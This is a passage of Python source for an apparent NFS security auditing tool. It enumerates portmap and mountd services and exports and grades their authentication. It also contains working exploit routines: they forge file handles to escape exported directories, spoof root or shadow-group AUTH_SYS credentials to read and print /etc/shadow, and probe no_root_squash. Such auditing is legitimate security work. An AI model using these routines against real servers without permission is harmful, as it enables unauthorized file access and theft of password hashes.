import sys
import collections
import binascii
from pprint import pprint
import logging
import subprocess
import time
import pathlib
from typing import List
from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
import os
import importlib
import json
import copy
import datetime
import traceback

import rpc.security

import nfs4.xdrdef as xdrdef

import nfs4.nfs3client as nfs3client
import nfs4.nfs4client as nfs4client

import nfs4.nfs4lib as nfs4lib

class JSONStatus:
    OK = "ok"
    SKIPPED = "skipped"
    UNKNOWN = "unknown"
    ERROR = "error"
    VULNERABLE = "vulnerable"

default_json_out = {
    "date": "",
    "portmap": {
        "status": JSONStatus.UNKNOWN,
        "reason": "",
    },
    "exports": {
        "status": JSONStatus.UNKNOWN,
    },
    "invalid_exports": {},
    "versions": {
        "status": JSONStatus.SKIPPED,
        "supported": None
    },
    "windows_handle_signing": {
        "status": JSONStatus.UNKNOWN,
        "reason": ""
    },
    "nfs4_overview": {
        "status": JSONStatus.UNKNOWN,
        "reason": "",
        "directories": {},
    }
}

default_findings = {
    "mountable_exports": {},
    "escapable_exports": {},
    "etc_shadow_exports": {},
    "no_root_squash_exports": {},
    "no_signing_hosts": [],
}

auth_sys = rpc.security.AuthSys()

options = None

class TerminalColors:
    OK = "\033[92m"
    WARN = "\033[93m"
    ERROR = "\033[91m"
    RESET = "\033[0m"

COLORS = TerminalColors()

def color_text(text, color):
    if not options.no_color:
        return f"{color}{text}{COLORS.RESET}"
    else:
        return text

class Coloring:
    def ok(text):
        return color_text(text, COLORS.OK)

    def warn(text):
        return color_text(text, COLORS.WARN)

    def error(text):
        return color_text(text, COLORS.ERROR)

def linked_list_to_array(list, element, nextptr):
    result = []
    current = list
    while current != []:
        result.append(getattr(current[0], element))
        current = getattr(current[0], nextptr)
    return result

def printable_len(string):
    length = 0
    escape_sequence = False
    for c in string:
        if not escape_sequence:
            if c == "\033":
                escape_sequence = True
            else:
                length +=1
        else:
            if c == "m":
                escape_sequence = False
    return length

def print_table(rows):
    if len(rows) <= 1:
        print("[empty]")
        return

    columns = printable_len(rows[0])
    max_lens = [0] * columns
    for row in rows:
        for i in range(columns):
            max_lens[i] = max(max_lens[i], printable_len(row[i]))
    
    for row in rows:
        for i in range(columns):
            print(row[i], end=" ")
            print(" " * (max_lens[i] - printable_len(row[i])), end=" ")
        print()

def pmap_mappings_to_array(mappings):
    return linked_list_to_array(mappings, "map", "next")

pmap_protocol_numbers = {
    100000: "portmap",
    100005: "mountd",
    100003: "nfs",
    100011: "rquota",
    100021: "nfs lock manager",
    100024: "status monitor 2",
    100227: "nfs acl",
    400010: "netapp partner",
    400122: "localio",
}

def pmap_num_to_str(prog):
    if prog in pmap_protocol_numbers:
        return pmap_protocol_numbers[prog]
    else:
        return f"Unknown service {prog}"

def pmap_print_summary(mappings, json_out):
    maps = pmap_mappings_to_array(mappings)
    services = dict()
    for map in maps:
        if map.prog in services:
            services[map.prog].add(map.vers)
        else:
            services[map.prog] = {map.vers}
    
    print("Supported protocol versions reported by portmap:")
    data = [("Protocol", "Versions")]
    data += [(pmap_num_to_str(service), ", ".join([str(vers) for vers in sorted(services[service])])) for service in services]
    print_table(data)

    json_out["portmap"]["status"] = JSONStatus.OK
    json_out["portmap"]["raw"] = [map.__dict__ for map in maps]
    json_out["portmap"]["services"] = {pmap_num_to_str(service): sorted(services[service]) for service in services}

def pmap_get_mountd_port(mappings):
    for map in pmap_mappings_to_array(mappings):
        if map.prog == 100005 and map.vers == 3 and map.prot == 6:
            return map.port
    
    return -1


Export = collections.namedtuple("Export", ["directory", "groups"])

def mount_groups_to_array(groups):
    return linked_list_to_array(groups, "gr_name", "gr_next")

def mount_exports_to_array(exports):
    result = []
    current = exports
    while current != []:
        result.append(Export(current[0].ex_dir, mount_groups_to_array(current[0].ex_groups)))
        current = current[0].ex_next
    return result

Mountbody = collections.namedtuple("Mountbody", ["hostname", "directory"])

def mount_mountlist_to_array(mountlist):
    result = []
    current = mountlist
    while current != []:
        result.append(Mountbody(current[0].ml_hostname, current[0].ml_directory))
        current = current[0].ml_next
    return result

def mount_get_all_info(mount_client: nfs3client.Mnt3Client, exports: xdrdef.mnt3_type.exportnode):
    result = dict()
    for export in mount_exports_to_array(exports):
        response = mount_client.proc(xdrdef.mnt3_const.MOUNTPROC3_MNT, export.directory, "mountres3")
        result[export.directory] = response
    
    try:
        mount_client.proc(xdrdef.mnt3_const.MOUNTPROC3_UMNTALL, 0, "void")
    except Exception as e:
        print(f"Error unmounting exports, IP might remain in rmtab on the server: {e}")

    return result

def mount_get_all_clients(mount_client: nfs3client.Mnt3Client):
    try:
        response = mount_client.proc(xdrdef.mnt3_const.MOUNTPROC3_DUMP, 0, "mountlist")
        return response
    except Exception as e:
        print(f"Error getting list of clients: {e}")
        return []

def get_auth_method(number):
    auth_method_numbers = {
        0: ("none", Coloring.error("none")),
        1: ("sys", Coloring.error("sys")),
        3: ("dh", Coloring.error("dh")),
        390003: ("krb5", Coloring.warn("krb5")),
        390004: ("krb5i", "krb5i"),
        390005: ("krb5p", Coloring.ok("krb5p")),
    }

    return auth_method_numbers.get(number, str(number))

def ping_host(host):
    if host in ping_host.cache:
        return ping_host.cache[host]
    else:
        if "%" in host:
            host = host.split("%")[0]
        result = False
        try:
            result = subprocess.run(["timeout", str(options.ping_timeout), "ping", "-c", "1", host], stdout=subprocess.DEVNULL).returncode == 0
        except Exception as e:
            print("ping error")
            result = False
        ping_host.cache[host] = result
        return result

ping_host.cache = dict()

def get_host_info(host):
    if host == "*":
        return ({"type": "wildcard", "status": JSONStatus.UNKNOWN}, Coloring.error("(wildcard)"))

    if "*" in host or "?" in host or "[" in host:
        return ({"type": "wildcard", "status": JSONStatus.UNKNOWN}, Coloring.warn("(wildcard)"))
    
    if "/" in host:
        return ({"type": "wildcard", "status": JSONStatus.UNKNOWN}, Coloring.warn("(subnet)"))
    
    if "@" in host:
        return ({"type": "netgroup", "status": JSONStatus.UNKNOWN}, "(netgroup)")
    
    if not options.no_ping:
        is_up = ping_host(host)
        if is_up:
            return ({"type": "host", "status": "up"}, Coloring.ok("(up)"))
        else:
            return ({"type": "host", "status": "down"}, Coloring.error("(down)"))
    else:
        return ({"type": "host", "status": JSONStatus.UNKNOWN}, "")
    
def get_host_info_json(host):
    result = {"host": host, "type": JSONStatus.UNKNOWN, "status": JSONStatus.UNKNOWN}
    

def mount_print_details(exports: xdrdef.mnt3_type.exportnode, mount_results, json_out):
    data = [("Directory", "Allowed clients", "Auth methods", "Export file handle")]

    json_out["exports"]["status"] = JSONStatus.OK
    json_out["exports"]["directories"] = dict()
    #json_out["exports"]["directories"] = {export.directory.decode(options.charset): {} for export in exports}

    for export in mount_exports_to_array(exports):
        groups = [group.decode(options.charset) + get_host_info(group.decode(options.charset))[1] for group in export.groups]
        group_text = ", ".join(groups) if groups != [] else Coloring.error("(everyone)")
        auth_methods_text = ""
        file_handle_text = ""
        if export.directory in mount_results:
            result = mount_results[export.directory]
            if result.fhs_status == xdrdef.mnt3_const.MNT3_OK:
                auth_methods = []
                for auth_method in result.auth_flavors:
                    auth_methods.append(get_auth_method(auth_method)[1])
                auth_methods_text = ", ".join(auth_methods)
                file_handle_text = binascii.hexlify(result.fhandle).decode()
            elif result.fhs_status == xdrdef.mnt3_const.MNT3ERR_ACCES:
                auth_methods_text = "Access denied"
            else:
                auth_methods_text = f"mount failed, response: {xdrdef.mnt3_const.mountstat3[result.fhs_status]}"
        else:
            auth_methods_text = "No response received"
        data.append((export.directory.decode(options.charset), group_text, auth_methods_text, file_handle_text))
        json_out["exports"]["directories"][export.directory.decode(options.charset)] = {
            "allowed_clients": [{"name": group.decode(options.charset)} | get_host_info(group.decode(options.charset))[0] for group in export.groups],
            "mount_result": xdrdef.mnt3_const.mountstat3[result.fhs_status],
            "auth_methods": None if result.fhs_status != xdrdef.mnt3_const.MNT3_OK else [get_auth_method(auth_method)[0] for auth_method in result.auth_flavors],
            "file_handle": file_handle_text,
            "clients": [],
            "escape": {
                "status": JSONStatus.UNKNOWN,
                "reason": "",
                "fstype": FileID.unknown,
                "parent_inode": None,
                "root_fh": None,
                "root_dir": None,
                "etc_shadow": {
                    "status": JSONStatus.UNKNOWN,
                    "reason": "",
                    "content": None,
                },
                "symlink_escape": {
                    "status": JSONStatus.UNKNOWN,
                    "reason": "",
                    "directory": None,
                }
            },
            "no_root_squash": {
                "status": JSONStatus.SKIPPED,
                "reason": "",
            }
        }
    print("Available Exports reported by mountd:")
    print_table(data)


def mount_print_clients(clients: xdrdef.mnt3_type.mountbody, json_out):
    data = [("Client", "Export")]
    for entry in mount_mountlist_to_array(clients):
        hostname = entry.hostname.decode(options.charset)
        directory = entry.directory.decode(options.charset)
        data.append((hostname + get_host_info(hostname)[1], directory))
        host_info = {"name": hostname} | get_host_info(hostname)[0]
        if directory in json_out["exports"]["directories"]:
            json_out["exports"]["directories"][directory]["clients"].append(host_info)
        else:
            if directory in json_out["invalid_exports"]:
                json_out["invalid_exports"][directory].append(host_info)
            else:
                json_out["invalid_exports"][directory] = [host_info]

    print("Connected clients reported by mountd:")
    print_table(data)

class FileID:
    root = "root"
    ext = "ext/xfs"
    btrfs = "btrfs"
    udf = "udf"
    nilfs = "nilfs"
    fat = "fat"
    lustre = "lustre"
    kernfs = "kernfs"
    invalid = "invalid"
    unknown = "unknown"

fileid_types = {
    0: FileID.root,
    1: FileID.ext,
    2: FileID.ext,
    0x81: FileID.ext,
    0x4d: FileID.btrfs,
    0x4e: FileID.btrfs,
    0x4f: FileID.btrfs,
    0x51: FileID.udf,
    0x52: FileID.udf,
    0x61: FileID.nilfs,
    0x62: FileID.nilfs,
    0x71: FileID.fat,
    0x72: FileID.fat,
    0x97: FileID.lustre,
    0xfe: FileID.kernfs,
    0xff: FileID.invalid
}

fsid_lens = {
    0: 8,
    1: 4,
    2: 12,
    3: 8,
    4: 8,
    5: 8,
    6: 16,
    7: 24,
}

def nfs3_check_escape(nfs3_client: nfs3client.NFS3Client, root_fh: bytearray, export: bytearray, json_entry: dict, btrfs_subvolume_id = None):
    result = nfs3_readdir_plus(nfs3_client, root_fh)
    if result != []:
        dir_list = [entry.name.decode(options.charset) for entry in result]
        if btrfs_subvolume_id == None:
            print(Coloring.error("Escape successful, root directory listing:"))
        else:
            print(Coloring.error(f"Escape successful, root directory listing of subvolume {btrfs_subvolume_id}:"))
        print(Coloring.error(" ".join(dir_list)))
        print(Coloring.error(f"Root file handle: {binascii.hexlify(root_fh).decode()}"))
        print()

        json_entry["status"] = JSONStatus.VULNERABLE
        if btrfs_subvolume_id == None:
            json_entry["root_fh"] = binascii.hexlify(root_fh).decode()
            json_entry["root_dir"] = dir_list
        else:
            if not "root_fh" in json_entry or json_entry["root_fh"] == None:
                json_entry["root_fh"] = "BTRFS subvolumes:"
                json_entry["root_dir"] = "BTRFS subvolumes:"
            json_entry["root_fh"] += f"\n{btrfs_subvolume_id}: {binascii.hexlify(root_fh).decode()}"
            json_entry["root_dir"] += f"\n{btrfs_subvolume_id}: {dir_list}"

        nfs3_read_etc_shadow(nfs3_client, root_fh, json_entry["etc_shadow"])
        nfs3_check_root_permissions(nfs3_client, root_fh, export, json_entry["symlink_escape"])
        return True
    else:
        if json_entry["status"] != JSONStatus.VULNERABLE:
            json_entry["status"] = JSONStatus.OK
    return False

def nfs3_try_escape(nfs3_client: nfs3client.NFS3Client, mount_results, json_out):
    print("Trying to escape exports")
    for directory in mount_results:
        mount_result = mount_results[directory]
        json_entry = json_out["exports"]["directories"][directory.decode(options.charset)]["escape"]
        if mount_result.fhs_status != xdrdef.mnt3_const.MNT3_OK or mount_result.fhandle == None or mount_result.fhandle == b"":
            json_entry["status"] = JSONStatus.ERROR
            json_entry["reason"] = "mount_failed"
            continue

        export_fh = bytearray(mount_result.fhandle)
        
        if len(export_fh) < 5 or export_fh[0] != 1:
            print(Coloring.ok("Escape failed") + ", unknown file handle type, server probably not Linux")
            print()
            json_entry["status"] = JSONStatus.OK
            json_entry["reason"] = "not_linux"
            return b""

        filesystem = FileID.unknown
        export_dir: List[xdrdef.nfs3_type.entryplus3] = nfs3_readdir_plus(nfs3_client, export_fh)
        parent_handle = None
        parent_fileid = None
        export_fileid = None
        for entry in export_dir:
            if entry.name == b".":
                export_fileid = entry.fileid
            if entry.name == b"..":
                parent_fileid = entry.fileid
                if entry.name_handle.handle_follows:
                    parent_handle = entry.name_handle.handle.data
            elif filesystem == FileID.unknown and entry.name != b"." and entry.name_handle.handle_follows:
                if entry.name_handle.handle == None or entry.name_handle.handle.data == None or len(entry.name_handle.handle.data) < 5:
                    pass
                else:
                    fh_fileid = entry.name_handle.handle.data[3]
                    if fh_fileid in fileid_types:
                       filesystem = fileid_types[fh_fileid]
        
        print(f"Export: {directory.decode(options.charset)}: file system type {filesystem}, parent: {parent_handle}, {parent_fileid}")

        json_entry["fstype"] = filesystem
        json_entry["parent_inode"] = parent_fileid

        fsid_type = export_fh[2]
        if fsid_type not in fsid_lens:
            print("Unsupported fsid")

            json_entry["status"] = JSONStatus.ERROR
            json_entry["reason"] = "unsupported_fsid"

            continue

        fsid_len = fsid_lens[fsid_type]
        root_fh = export_fh

        if filesystem == FileID.ext or filesystem == FileID.unknown:
            if export_fileid in [2, 128]:
                print(Coloring.ok("Escape failed, export is root of filesystem"))
                print()

                json_entry["status"] = JSONStatus.OK
                json_entry["reason"] = "export_is_root"

                continue

            root_fh[3] = 2
            root_fh[4 + fsid_len :] = [0x2, 0x0, 0x0, 0x0,    0x0, 0x0, 0x0, 0x0,    0x2, 0x0, 0x0, 0x0,    0x0, 0x0, 0x0, 0x0]
            logging.info(f"trying filehandle {root_fh}")
            if nfs3_check_escape(nfs3_client, root_fh, directory, json_entry):
                continue

            root_fh[3] = 2
            root_fh[4 + fsid_len :] = [128, 0x0, 0x0, 0x0,    0x0, 0x0, 0x0, 0x0,    128, 0x0, 0x0, 0x0,    0x0, 0x0, 0x0, 0x0]
            logging.info(f"trying filehandle {root_fh}")
            if nfs3_check_escape(nfs3_client, root_fh, directory, json_entry):
                continue

        if filesystem == FileID.btrfs or filesystem == FileID.unknown:
            escape_success = False
            for i in range(options.btrfs_subvolumes):
                root_fh[3] = 0x4d
                root_fh[4 + fsid_len :] = [0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, i, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
                logging.info(f"trying filehandle {root_fh}")
                if nfs3_check_escape(nfs3_client, root_fh, directory, json_entry, i + 256):
                    escape_success = True
                    continue
            
            if escape_success:
                continue
        
        print(Coloring.ok("Escape failed"))
        print()

def nfs3_read_etc_shadow(nfs3_client: nfs3client.NFS3Client, root_fh: bytearray, json_entry: dict):
    etc = nfs3_lookup(nfs3_client, root_fh, b"etc")
    if etc != None:
        test_files = ["shadow"]
        for file_name in test_files:
            shadow = nfs3_lookup(nfs3_client, etc, file_name.encode(options.charset))
            if shadow == None:
                json_entry["status"] = JSONStatus.OK
                json_entry["reason"] = "file_not_found"
                continue
            read_res = nfs3_read_file(nfs3_client, shadow)
            if read_res.status != xdrdef.nfs3_const.NFS3_OK:
                if read_res.resfail != None and read_res.resfail.file_attributes != None and read_res.resfail.file_attributes.attributes_follow and read_res.resfail.file_attributes.attributes != None:
                    gid = read_res.resfail.file_attributes.attributes.gid
                    old_credential = nfs3_client.default_cred

                    no_root_squash_enabled = False
                    if True:
                        new_credential = auth_sys.init_cred(0, 0, b"test", 41, [1001])
                        nfs3_client.set_cred(new_credential)
                        shadow_res = nfs3_read_entire_file(nfs3_client, shadow)
                        if shadow_res.status == xdrdef.nfs3_const.NFS3_OK:
                            no_root_squash_enabled = True
                            content = shadow_res.resok.data.decode(options.charset)
                            print(Coloring.error("no_root_squash ENABLED, FULL ROOT ACCESS TO SYSTEM"))
                            print(Coloring.error(f"Content of /etc/{file_name}:"))
                            print(Coloring.error(content))
                            json_entry["status"] = JSONStatus.VULNERABLE
                            json_entry["reason"] = "no_root_squash"
                            json_entry["content"] = content
                    if not no_root_squash_enabled and gid != 0:
                        print(Coloring.error(f"GID of shadow group: {gid}"))
                        new_credential = auth_sys.init_cred(1000, gid, b"test", 42, [1001,1002])
                        nfs3_client.set_cred(new_credential)
                        shadow_res = nfs3_read_entire_file(nfs3_client, shadow)
                        if shadow_res.status == xdrdef.nfs3_const.NFS3_OK:
                            content = shadow_res.resok.data.decode(options.charset)
                            print(Coloring.error(f"Content of /etc/{file_name}:"))
                            print(Coloring.error(content))
                            json_entry["status"] = JSONStatus.VULNERABLE
                            json_entry["reason"] = f"shadow_group {gid}"
                            json_entry["content"] = content


                    nfs3_client.set_cred(old_credential)
            elif read_res.status == xdrdef.nfs3_const.NFS3_OK:
                content = read_res.resok.data.decode(options.charset)
                print(Coloring.error(f"File /etc/{file_name} readable by unprivileged user"))
                print(Coloring.error(f"Content of /etc/{file_name}:"))
                print(Coloring.error(content))
                json_entry["status"] = JSONStatus.VULNERABLE
                json_entry["reason"] = f"wrong_permissions"
                json_entry["content"] = content

def nfs3_check_no_root_squash(nfs3_client: nfs3client.NFS3Client, mount_results, json_out):
    print("Checking no_root_squash")
    data = [("Export", "no_root_squash")]
    test_file = b"nfs_analyze_test"
    old_credential = nfs3_client.default_cred
    root_credential = auth_sys.init_cred(0, 0, b"test", 43, [1001])
    nfs3_client.set_cred(root_credential)
    for directory in mount_results:
        mount_result = mount_results[directory]
        if mount_result.fhs_status == xdrdef.mnt3_const.MNT3_OK and mount_result.fhandle != None and mount_result.fhandle != b"":
            status_text = ""
            json_entry = json_out["exports"]["directories"][directory.decode(options.charset)]["no_root_squash"]
            json_entry["status"] = JSONStatus.UNKNOWN
            if 1 not in mount_result.auth_flavors:
                status_text = Coloring.ok("AUTH_SYS not supported") + " (no_root_squash status unknown)"
                json_entry["status"] = JSONStatus.UNKNOWN
                json_entry["reason"] = "auth_sys_not_supported"
            else:
                export_fh = mount_result.fhandle
                try:
                    mkdir_result = nfs3_mkdir(nfs3_client, export_fh, test_file, 0, 0, 0o600)
                except rpc.rpc.RPCDeniedError as e:
                    json_entry["status"] = JSONStatus.OK
                    json_entry["reason"] = "disabled"
                    status_text = Coloring.ok("DISABLED")
                else:
                    if mkdir_result.status == xdrdef.nfs3_const.NFS3_OK:
                        status_text = Coloring.warn("UNKNOWN")
                        if mkdir_result.resok.obj_attributes.attributes_follow:
                            if mkdir_result.resok.obj_attributes.attributes.uid == 0:
                                json_entry["status"] = JSONStatus.VULNERABLE
                                json_entry["reason"] = "enabled"
                                status_text = Coloring.error("ENABLED (privilege escalation on client possible)")
                            else:
                                json_entry["status"] = JSONStatus.OK
                                json_entry["reason"] = "disabled"
                                status_text = Coloring.ok("DISABLED")
                        rmdir_result = nfs3_rmdir(nfs3_client, export_fh, test_file)
                        if rmdir_result.status != xdrdef.nfs3_const.NFS3_OK:
                            json_entry["status"] = JSONStatus.ERROR
                            json_entry["reason"] = "could_not_delete_test_directory"
                            status_text += Coloring.error(f" Could not delete test directory. Please delete {directory.decode()}/{test_file.decode()} manually")
                    elif mkdir_result.status == xdrdef.nfs3_const.NFS3ERR_ROFS:
                        json_entry["status"] = JSONStatus.UNKNOWN
                        json_entry["reason"] = "readonly"
                        status_text = Coloring.ok("READONLY") + " (no_root_squash status unknown)"
                    elif mkdir_result.status == xdrdef.nfs3_const.NFS3ERR_ACCES:
                        json_entry["status"] = JSONStatus.OK
                        json_entry["reason"] = "disabled"
                        status_text = Coloring.ok("DISABLED")
                    elif mkdir_result.status == xdrdef.nfs3_const.NFS3ERR_EXIST:
                        status_text = Coloring.error("Test directory exists from previous test exists")
                        json_entry["status"] = JSONStatus.ERROR
                        json_entry["reason"] = "test_directory_exists"
                        rmdir_result = nfs3_rmdir(nfs3_client, export_fh, test_file)
                        if rmdir_result.status != xdrdef.nfs3_const.NFS3_OK:
                            status_text += Coloring.error(f" Could not delete test directory. Please delete {directory.decode()}/{test_file.decode()} manually")
                            json_entry["status"] = JSONStatus.ERROR
                            json_entry["reason"] = "could_not_delete_test_directory"
                        else:
                            status_text += " Successfully deleted test directory"

            
            data.append((directory.decode(options.charset), status_text))
        
    print_table(data)
    nfs3_client.set_cred(old_credential)

def nfs3_check_root_permissions(nfs3_client: nfs3client.NFS3Client, root_fh: bytearray, export: bytearray, json_entry: dict):
    path = list(pathlib.Path(export.decode(options.charset)).parts)
    #print(path)
    #print(nfs3_lookup_raw(nfs3_client, root_fh, b"."))
    #path[0] = "."
    current_fh = root_fh
    for directory in path[1:]:
        lookup_res = nfs3_lookup_raw(nfs3_client, current_fh, directory.encode(options.charset))
        #print(lookup_res)
        if lookup_res.status != xdrdef.nfs3_const.NFS3_OK:
            continue
        current_fh = lookup_res.resok.object.data
        if not lookup_res.resok.dir_attributes.attributes_follow:
            continue
        dir_attrs = lookup_res.resok.dir_attributes.attributes

        uid = dir_attrs.uid
        gid = dir_attrs.gid
        mode = dir_attrs.mode
        #print(f"{directory}: {uid}, {gid}: {oct(mode)}")

        if uid != 0 or gid != 0 or mode & 0b000000010 != 0:
            print(Coloring.error(f"Full escape might be possible: Path component {directory} has a writable parent directory and can be replaced with a symlink"))
            print()

            json_entry["status"] = JSONStatus.VULNERABLE
            json_entry["reason"] = "writable_parent_directory"
            json_entry["directory"] = directory

            break
    
    json_entry["status"] = JSONStatus.OK
    json_entry["reason"] = "correct_permissions"



def nfs4_secinfo_to_string(secinfo: xdrdef.nfs4_type.secinfo4):
    if secinfo.flavor == 6:
        if secinfo.flavor_info == None:
            return Coloring.error("gss(unknown)")
        if secinfo.flavor_info.service == xdrdef.nfs4_const.RPC_GSS_SVC_NONE:
            return Coloring.warn("krb5")
        if secinfo.flavor_info.service == xdrdef.nfs4_const.RPC_GSS_SVC_INTEGRITY:
            return "krb5i"
        if secinfo.flavor_info.service == xdrdef.nfs4_const.RPC_GSS_SVC_PRIVACY:
            return Coloring.ok("krb5p")
    if secinfo.flavor == 1:
        return Coloring.error("sys")
    return Coloring.error(f"unknown (secinfo.flavor)")

def nfs4_secinfo_to_json(secinfo: xdrdef.nfs4_type.secinfo4):
    if secinfo.flavor == 6:
        if secinfo.flavor_info == None:
            return "gss(unknown)"
        if secinfo.flavor_info.service == xdrdef.nfs4_const.RPC_GSS_SVC_NONE:
            return "krb5"
        if secinfo.flavor_info.service == xdrdef.nfs4_const.RPC_GSS_SVC_INTEGRITY:
            return "krb5i"
        if secinfo.flavor_info.service == xdrdef.nfs4_const.RPC_GSS_SVC_PRIVACY:
            return "krb5p"
    if secinfo.flavor == 1:
        return "sys"
    return f"unknown (secinfo.flavor)"


def nfs4_dir_secinfo(nfs4_client: nfs4client.NFS4Client | nfs4client.SessionRecord, json_entry, file_handle, depth, limit = 10, maxdepth=2):
    dir_result = nfs4_list_dir(nfs4_client, file_handle)
    if len(dir_result.resarray) < 2 or dir_result.resarray[1].opreaddir == None or dir_result.resarray[1].opreaddir.status != xdrdef.nfs4_const.NFS4_OK:
        print(f"{' ' * depth * 4}Error reading directory" + f" {dir_result.resarray[1].opreaddir.status}" if options.verbose_errors else "")
    else:
        entries = dir_result.resarray[1].opreaddir.resok4.entries
        for entry in entries:
            if entry.attrs[xdrdef.nfs4_const.FATTR4_TYPE] == xdrdef.nfs4_const.NF4DIR:
                entry_name = entry.name.decode(options.charset)
                print(f"{' ' * depth * 4}{entry_name}: ", end="")
                json_entry |= {entry_name : {"security": None, "children": {}}}
                secinfo_result = nfs4_secinfo(nfs4_client, file_handle, entry.name)
                if len(secinfo_result.resarray) < 2 or secinfo_result.resarray[1].opsecinfo == None or secinfo_result.resarray[1].opsecinfo.status != xdrdef.nfs4_const.NFS4_OK:
                    print("Error getting security information")
                else:
                    print(", ".join([nfs4_secinfo_to_string(secinfo) for secinfo in secinfo_result.resarray[1].opsecinfo.resok4]))
                    json_entry[entry_name]["security"] = [nfs4_secinfo_to_json(secinfo) for secinfo in secinfo_result.resarray[1].opsecinfo.resok4]
                    if depth < maxdepth:
                        nfs4_dir_secinfo(nfs4_client, json_entry[entry_name]["children"], entry.attrs[xdrdef.nfs4_const.FATTR4_FILEHANDLE], depth+1, limit, maxdepth)
            pass

def nfs4_show_overview(nfs4_client: nfs4client.NFS4Client | nfs4client.SessionRecord, json_out):
    print("NFSv4 overview and auth methods")
    try:
        root_fh = nfs4_get_root_fh(nfs4_client)
        nfs4_dir_secinfo(nfs4_client, json_out["nfs4_overview"]["directories"], root_fh.resarray[1].opgetfh.resok4.object, 0, 10, 2)
        json_out["nfs4_overview"]["status"] = JSONStatus.OK
    except Exception as e:
        print(f"Error listing directories: {e}")
        if options.verbose_errors:
            traceback.print_exc()
        json_out["nfs4_overview"]["status"] = JSONStatus.ERROR
        json_out["nfs4_overview"]["reason"] = str(e)


def nfs3_check_windows_signing(mount_results, json_out):
    print("NFSv3 Windows File Handle Signing: ", end="")
    for export in mount_results.values():
        if export.fhs_status == xdrdef.mnt3_const.MNT3_OK and export.fhandle != None:
            export_fh = export.fhandle
            if len(export_fh) != 32:
                json_out["windows_handle_signing"]["status"] = JSONStatus.OK
                json_out["windows_handle_signing"]["reason"] = "not_windows"
                print(Coloring.ok("OK") + ", server probably not Windows, File Handle not 32 bytes long")
                return

            if export_fh[-10:] == b"\x00"*10:
                json_out["windows_handle_signing"]["status"] = JSONStatus.VULNERABLE
                json_out["windows_handle_signing"]["reason"] = "disabled"
                print(Coloring.error("DISABLED (arbitrary access possible)"))
                return
            
            print(Coloring.ok("Enabled"))
            json_out["windows_handle_signing"]["status"] = JSONStatus.OK
            json_out["windows_handle_signing"]["reason"] = "enabled"
            return

    json_out["windows_handle_signing"]["status"] = JSONStatus.UNKNOWN
    json_out["windows_handle_signing"]["reason"] = "no_suitable_export"
    print("Testing not possible, no export available")

def nfs41_check_windows_signing(nfs41_session: nfs4client.SessionRecord):
    print("NFSv4.1 Windows File Handle Signing: ", end="")
    root_fh = nfs4_get_root_fh(nfs41_session)

def nfs3_lookup_raw(nfs3_client: nfs3client.NFS3Client, fh: bytearray, name: bytes):
    fh = xdrdef.nfs3_type.nfs_fh3(data=fh)
    diropargs = xdrdef.nfs3_type.diropargs3(dir = fh, name=name)
    lookupargs = xdrdef.nfs3_type.LOOKUP3args(what=diropargs)
    return nfs3_client.proc(xdrdef.nfs3_const.NFSPROC3_LOOKUP, lookupargs)

def nfs3_lookup(nfs3_client: nfs3client.NFS3Client, fh: bytearray, name: bytes):
    fh = xdrdef.nfs3_type.nfs_fh3(data=fh)
    diropargs = xdrdef.nfs3_type.diropargs3(dir = fh, name=name)
    lookupargs = xdrdef.nfs3_type.LOOKUP3args(what=diropargs)

    result: xdrdef.nfs3_type.LOOKUP3res = nfs3_client.proc(xdrdef.nfs3_const.NFSPROC3_LOOKUP, lookupargs)
    if result.status != xdrdef.nfs3_const.NFS3_OK:
        return None
    else:
        return result.resok.object.data

def nfs3_lookup_parent(nfs3_client: nfs3client.NFS3Client, export_fh: bytearray):
    fh = xdrdef.nfs3_type.nfs_fh3(data=export_fh)
    diropargs = xdrdef.nfs3_type.diropargs3(dir = fh, name=b"..")
    lookupargs = xdrdef.nfs3_type.LOOKUP3args(what=diropargs)

    print(nfs3_client.proc(xdrdef.nfs3_const.NFSPROC3_LOOKUP, lookupargs))

def nfs3_readdir_plus(nfs3_client: nfs3client.NFS3Client, dir_fh: bytearray):
    fh = xdrdef.nfs3_type.nfs_fh3(data=dir_fh)
    cookie = 0
    cookieverf = b""
    done = False
    entries = []
    while not done:
        readdirplusargs = xdrdef.nfs3_type.READDIRPLUS3args(dir=fh, cookie=cookie, cookieverf=cookieverf, maxcount=100000, dircount=1000)

        result = nfs3_client.proc(xdrdef.nfs3_const.NFSPROC3_READDIRPLUS, readdirplusargs)
        if result == None or result.status != xdrdef.nfs3_const.NFS3_OK:
            return entries
        else:
            current = result.resok.reply.entries
            while current != []:
                current = current[0]
                entries.append(current)
                cookie = current.cookie
                current = current.nextentry
            if not result.resok.reply.eof:
                cookieverf = result.resok.cookieverf
            else:
                done = True
    
    return entries
            
def nfs3_read_file(nfs3_client: nfs3client.NFS3Client, file_fh: bytearray, offset = 0, count = 4096) -> xdrdef.nfs3_type.READ3res:
    fh = xdrdef.nfs3_type.nfs_fh3(data=file_fh)
    readargs = xdrdef.nfs3_type.READ3args(file = fh, offset = offset, count = count)
    return nfs3_client.proc(xdrdef.nfs3_const.NFSPROC3_READ, readargs)

def nfs3_read_entire_file(nfs3_client: nfs3client.NFS3Client, file_fh: bytearray) -> xdrdef.nfs3_type.READ3res:
    done = False
    data = b""
    offset = 0
    attributes = None
    while not done:
        read_res = nfs3_read_file(nfs3_client, file_fh, offset, 4096)
        if read_res.status == xdrdef.nfs3_const.NFS3_OK:
            data += read_res.resok.data
            offset += read_res.resok.count
            done = read_res.resok.eof
            attributes = read_res.resok.attributes
        else:
            return read_res
    
    result_ok = xdrdef.nfs3_type.READ3resok(attributes, offset, True, data)
    result = xdrdef.nfs3_type.READ3res(xdrdef.nfs3_const.NFS3_OK, result_ok)

    return result

def nfs3_create_link(nfs3_client: nfs3client.NFS3Client, target_fh: bytearray, dir_fh: bytearray, name: bytearray):
    target_fh = xdrdef.nfs3_type.nfs_fh3(data=target_fh)
    dir_fh = xdrdef.nfs3_type.nfs_fh3(data=dir_fh)
    diropargs = xdrdef.nfs3_type.diropargs3(dir=dir_fh, name=name)
    linkargs = xdrdef.nfs3_type.LINK3args(file=target_fh, link=diropargs)
    print(nfs3_client.proc(xdrdef.nfs3_const.NFSPROC3_LINK, linkargs))

def nfs3_mkdir(nfs3_client: nfs3client.NFS3Client, parent_fh: bytearray, name: bytearray, uid, gid, mode):
    parent_fh = xdrdef.nfs3_type.nfs_fh3(data=parent_fh)
